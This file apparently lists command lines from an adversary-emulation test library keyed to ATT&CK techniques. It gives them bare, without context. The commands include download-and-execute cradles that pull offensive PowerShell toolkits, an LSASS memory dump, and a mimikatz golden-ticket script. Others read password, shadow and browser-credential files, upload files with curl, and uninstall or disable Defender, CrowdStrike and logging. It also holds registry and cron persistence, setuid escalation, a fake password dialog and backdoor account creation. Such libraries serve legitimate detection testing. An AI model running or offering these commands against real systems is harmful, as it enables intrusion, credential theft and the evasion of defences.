at 13:20 /interactive cmd
echo Get-Process | clip;Get-Clipboard | iex
scp #{local_file} #{username}@#{remote_host}:#{remote_path}
Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb;Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb
PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'&&echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"&&tail /var/log/syslog
REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
sudo log erase --all&&sudo log erase --ttl #Deletes only time-to-live log content
Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}
osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose
sudo dscl . -create /Users/#{user_name} UniqueID 333
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
if (!(Test-Path -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")){;  New-Item -ItemType Key -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run";};Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" -Name "#{target_key_value_name}" -Value "#{payload}"
timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1');Invoke-watson
. "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1";$ppid=Get-Process #{parent_process_name} | select -expand id;PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
"#{exe_binary}"
Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green;Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1";Invoke-PowerDump
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');GPOAudit -noninteractive -consoleoutput
useradd -M -N -r -s /bin/bash -c evil_account #{username}
echo "#{command}" > /etc/cron.d/#{cron_script_name}
Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false ;Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass};(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = "CommunitySupported"});Disconnect-VIServer -Confirm:$false
$excludedpath= "#{excluded_folder}";Add-MpPreference -ExclusionPath $excludedpath
$PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\";cmd /c #{venv_path}\Scripts\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath};cat #{Out_Filepath}
$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> #{output_file} \;&&cat #{output_file} 2>/dev/null
Stop-Service -Name #{service_name};Remove-Service -Name #{service_name}
halt -p
cp #{payload} /tmp/cap.c&&make /tmp/cap&&sudo setcap cap_setuid=ep /tmp/cap&&/tmp/cap
Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" #{pid}
export AWS_REGION=#{aws_region} &&cd #{stratus_path}&&echo "starting warmup"&&./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule&&echo "starting detonate"&&./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force
Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe;$file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe";Start-Process $file1 /S;
net.exe stop #{service_name}
# Set the registry values for http and https to 0;Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'http' -Value 0;Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');printercheck -noninteractive -consoleoutput
set +o history
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value #{NEW_Remote_Port};New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force;Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force;Start-Process "C:\Windows\System32\eventvwr.msc"
rmdir /s /q #{folder_to_delete}
$var =Invoke-WebRequest "#{hta_url}";$var.content|out-file "#{temp_file}";mshta "#{temp_file}";start-sleep -s 15;stop-process -name "calculator" -Force
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "/? `"$InstallerAssemblyFullPath`"";$ExpectedOutput = 'Constructor_HelpText_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';    CommandLine = $CommandLine;};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
pwpolicy getaccountpolicies
shred -u #{file_to_shred}
useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art&&usermod --lock art&&usermod --expiredate "1" art&&usermod --unlock art&&usermod --expiredate "99999" art&&su art&&whoami&&exit
New-Item -ItemType Directory -path "#{new_startup_folder}";Copy-Item -path "#{payload}" -destination "#{new_startup_folder}";Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macroCode = Get-Content "#{macro_path}" -Raw;$URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}";$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}";Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
screencapture #{output_file}
#{compiled_file} /tmp/ T1222002
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');obfuskittiedump -consoleoutput -noninteractive
$termsrvDll = "C:\Windows\System32\termsrv.dll";;$ACL = Get-Acl $termsrvDll;$permission = "Administrators","FullControl","Allow";$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission;$ACL.SetAccessRule($accessRule);Set-Acl -Path $termsrvDll -AclObject $ACL;;Copy-Item -Path "C:\Windows\System32\termsrv.dll" -Destination "C:\Windows\System32\termsrv_backup.dll" -ErrorAction Ignore;Add-Content -Path "C:\Windows\System32\termsrv.dll" -Value "`n" -NoNewline -ErrorAction Ignore;Move-Item -Path "C:\Windows\System32\termsrv_backup.dll" -Destination "C:\Windows\System32\termsrv.dll" -Force -ErrorAction Ignore
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
cat /etc/passwd > #{output_file}&&cat #{output_file}
"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"
$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop
Get-ChildItem "#{file_path}" | % { $_.CreationTime = "#{target_date_time}" }
cp #{payload} /tmp/hello.c&&chown root /tmp/hello.c&&make /tmp/hello&&chown root /tmp/hello&&chmod u+s /tmp/hello&&/tmp/hello
New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name DisableCMD -Value 1
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers&&sudo visudo -c -f /etc/sudoers
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} /f;netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
kldstat | grep -i "vmm"&&kldstat | grep -i "vbox"
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
kubectl get secrets -n #{namespace}
#{msbuildpath}\#{msbuildname} "#{filename}"
echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}
attrib.exe +h #{file_to_modify}
which_python=$(which python || which python3 || which python3.9 || which python2)&&echo 'import requests' > #{python_script_name}&&echo 'import os' >> #{python_script_name}&&echo 'url = "#{script_url}"' >> #{python_script_name}&&echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}&&echo 'session = requests.session()' >> #{python_script_name}&&echo 'source = session.get(url).content' >> #{python_script_name}&&echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}&&echo 'fd.write(source)' >> #{python_script_name}&&echo 'fd.close()' >> #{python_script_name}&&echo 'os.system(malicious_command)' >> #{python_script_name}&&$which_python -c 'import py_compile; py_compile.compile("#{python_script_name}", "#{python_binary_name}")'&&$which_python #{python_binary_name}
"#{psexec_exe}" #{remote_host} -accepteula -c #{command_path}
"#{uacme_exe}"
& "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi};Write-Host "End of PetitPotam attack"
reg add HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f
which_python=`which python || which python3`&&$which_python -c "from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')"
copy-item "$env:windir\System32\cmd.exe" -destination "$env:allusersprofile\cmd.exe";start-process "$env:allusersprofile\cmd.exe";sleep -s 5 ;stop-process -name "cmd" | out-null
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');safedump -consoleoutput -noninteractive
if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;&&if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;&&cat #{output_file}
sudo security add-trusted-cert -d -r trustRoot -k "/Library/Keychains/System.keychain" "#{cert_filename}"
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`"";$ExpectedOutput = 'Constructor_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';    CommandLine = $CommandLine;};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
unamestr=$(uname)&&if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > ${output_file}; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > ${output_file}; fi
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512;REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1;REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
lsmod&&kmod list&&grep vmw /proc/modules
hh.exe "#{local_chm_file}"
$ports = Get-content "#{port_file}";$file = "#{output_file}";$totalopen = 0;$totalports = 0;New-Item $file -Force;foreach ($port in $ports) {;    $test = new-object system.Net.Sockets.TcpClient;    $wait = $test.beginConnect("allports.exposed", $port, $null, $null);    $wait.asyncwaithandle.waitone(250, $false) | Out-Null;    $totalports++ | Out-Null;    if ($test.Connected) {;        $result = "$port open" ;        Write-Host -ForegroundColor Green $result;        $result | Out-File -Encoding ASCII -append $file;        $totalopen++ | Out-Null;    };    else {;        $result = "$port closed" ;        Write-Host -ForegroundColor Red $result;        $totalclosed++ | Out-Null;        $result | Out-File -Encoding ASCII -append $file;    };};$results = "There were a total of $totalopen open ports out of $totalports ports tested.";$results | Out-File -Encoding ASCII -append $file;Write-Host $results
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1";Invoke-ShareFinder #{parameters}
$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord;if((Get-ADUser #{remove_user} -Properties memberof).memberof -like "CN=Domain Admins*"){;  Remove-ADGroupMember -Identity "Domain Admins" -Members #{remove_user} -Credential $Credential -Confirm:$False;} else{;    write-host "Error - Make sure #{remove_user} is in the domain admins group" -foregroundcolor Red;}
$Server=#{logonserver};$User = Join-Path #{domain} #{username};$Password="#{password}";cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password;mstsc /v:$Server;echo "RDP connection established"
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');powershellsensitive -consoleoutput -noninteractive
$process = Start-Process #{spawn_process_path} -passthru;$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
Get-Content "#{image_file}", "#{tar_file}" -Encoding byte -ReadCount 0 | Set-Content "#{new_image_file}" -Encoding byte
7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}
net stop w32time;Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f;net start w32time
Get-Process
#{curl_path} -T #{file_path} #{remote_destination};#{curl_path} --upload-file #{file_path} #{remote_destination};#{curl_path} -d #{file_path} #{remote_destination};#{curl_path} --data #{file_path} #{remote_destination}
chattr -i #{file_to_modify}
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f;reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v StartMenuLogOff /t REG_DWORD /d 1 /f
echo '#\!/bin/sh' > #{rc_service_path}/#{rc_service_file}&&echo ' ' >> #{rc_service_path}/#{rc_service_file}&&echo '#' >> #{rc_service_path}/#{rc_service_file}&&echo '# PROVIDE: art-test' >> #{rc_service_path}/#{rc_service_file}&&echo '# REQUIRE: LOGIN' >> #{rc_service_path}/#{rc_service_file}&&echo '# KEYWORD: shutdown' >> #{rc_service_path}/#{rc_service_file}&&echo ' ' >> #{rc_service_path}/#{rc_service_file}&&echo '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file}&&echo ' ' >> #{rc_service_path}/#{rc_service_file}&&echo 'name="art_test"' >> #{rc_service_path}/#{rc_service_file}&&echo 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file}&&echo 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file}&&echo 'command="/usr/bin/touch"' >> #{rc_service_path}/#{rc_service_file}&&echo 'start_cmd="art_test_start"' >> #{rc_service_path}/#{rc_service_file}&&echo '' >> #{rc_service_path}/#{rc_service_file}&&echo 'art_test_start()' >> #{rc_service_path}/#{rc_service_file}     &&echo '{' >> #{rc_service_path}/#{rc_service_file}&&echo '  ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file}&&echo '}' >> #{rc_service_path}/#{rc_service_file}&&echo ' ' >> #{rc_service_path}/#{rc_service_file}     &&echo 'run_rc_command "$1"' >> #{rc_service_path}/#{rc_service_file}&&chmod +x #{rc_service_path}/#{rc_service_file}&&service art-test enable&&service art-test start
cat /dev/null > #{history_path}
crontab -l > /tmp/notevil&&echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
import -window root #{output_file}
halt -r
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore;Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore;;# get current domain SID if default was used;$domain_sid = "#{domain_sid}";If ($domain_sid -Match "DEFAULT") {;  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60;  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'));};;# create batch file with commands to run in a separate "runas /netonly" session;# so we don't purge Kerberos ticket from the current Windows session;# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise;@";>%TEMP%\golden.txt 2>&1 (;  echo Purge existing tickets and create golden ticket:;  klist purge;  #{mimikatz_path} "kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt" "exit";;  echo.;  echo Requesting SYSVOL:;  dir \\#{domain}\SYSVOL;  ;  echo.;  echo Tickets after requesting SYSVOL:;  klist;;  echo.;  echo End of Golden Ticket attack;);"@ -Replace "DOMAIN_SID", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat;;# run batch file in a new empty session (password and username do not matter);echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null;;# wait until the output file has logged the entire attack;do {;  Start-Sleep 1 # wait a bit so the output file has time to be created;  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {;    if ($_ -match 'End of Golden Ticket attack') { break } ;  };} while ($false) # dummy loop so that 'break' can be used;;# show output from new empty session;Get-Content $env:TEMP\golden.txt;;# cleanup temp files;Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore;Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
mv #{cert_filename} /usr/local/share/ca-certificates&&echo sudo update-ca-certificates
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
sudo systemctl stop systemd-journald #disables journal logging
which_python=$(which python || which python3 || which python3.9 || which python2)&&echo 'import requests' > #{python_script_name}&&echo 'import os' >> #{python_script_name}&&echo 'url = "#{script_url}"' >> #{python_script_name}&&echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}&&echo 'session = requests.session()' >> #{python_script_name}&&echo 'source = session.get(url).content' >> #{python_script_name}&&echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}&&echo 'fd.write(source)' >> #{python_script_name}&&echo 'fd.close()' >> #{python_script_name}&&echo 'os.system(malicious_command)' >> #{python_script_name}&&$which_python #{python_script_name}
if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] OU Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
csrutil status
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f;reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f;reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');domainpassspray -consoleoutput -noninteractive -emptypasswords
copy "#{dllfilename}" %systemroot%\system32\;sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto;sc config W64Time DisplayName= "Windows 64 Time";sc description W64Time "Maintain date and time synch on all clients and services in the network";reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f;reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f;sc start W64Time
#{regsvr32path}\#{regsvr32name} /s #{dll_file}
net user "#{username}" "#{password}" /add /domain;net group "#{group}" "#{username}" /add /domain
export #{proxy_scheme}_proxy=#{proxy_server}
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
